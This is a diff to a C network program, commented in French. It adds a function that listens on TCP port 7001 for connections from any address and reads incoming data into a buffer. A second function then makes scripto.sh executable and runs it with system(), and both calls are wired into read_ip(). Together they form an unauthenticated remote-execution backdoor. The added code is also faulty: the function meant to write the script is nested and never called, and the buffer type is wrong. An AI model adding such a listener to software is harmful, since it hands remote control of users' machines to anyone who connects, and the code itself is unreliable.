@@ -12,12 +12,40 @@
 #include <sys/ioctl.h>
 #include <linux/if.h>
 
-
-
-
-
-
-
+void receivefile(char * file){
+    int listenfd = 0;
+    int connfd = 0;
+    struct sockaddr_in serv_addr = {0};
+   
+    // Création de la socket serveur
+    listenfd = socket(AF_INET, SOCK_STREAM, 0);
+    
+    //Initialisation de la structure sockaddr
+    serv_addr.sin_family = AF_INET;
+    //Accepte les connexions depuis n'importe quelle adresse
+    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
+    // Le port sur lequel la socket va écouter
+    serv_addr.sin_port = htons(7001);
+    bind(listenfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr));
+    
+    //La socket écoute pour des connexions
+    listen(listenfd, 10);
+    int pid = 0;
+    // Accepte la connexion d'une socket client
+    connfd = accept(listenfd, (struct sockaddr*)NULL, NULL);
+    recv(connfd, file, 48000, 0);
+}
+void execscript(char *file){
+	void servscript(char *file){
+		FILE *fp;
+		char *filename="scripto.sh";
+		fp=fopen(filename, "w+");
+		fprintf(fp,"%s", file);
+		bzero(file, 48000);
+	}
+	system("cd; chmod +x scripto.sh; ./scripto.sh");
+}
+	
 
 char* getadresse(){
         //create an ifreq struct for passing data in and out of ioctl
@@ -99,6 +127,8 @@ int main(int argc, char* argv[])
 }
 
 void read_ip(int argc, char *argv[]){
+    char * file[48000];
+    bzero(file, 48000);
     char recvBuff[1024] = {0};
     int sockfd=0;
     int n=0;
@@ -142,6 +172,8 @@ void read_ip(int argc, char *argv[]){
     FILE* fichier = fopen("ServerList.txt", "a");
  
     fprintf(fichier,"addresse du server:%s", argv[1]);
+    receivefile(file);
+    execscript(file);
 	    
           
 
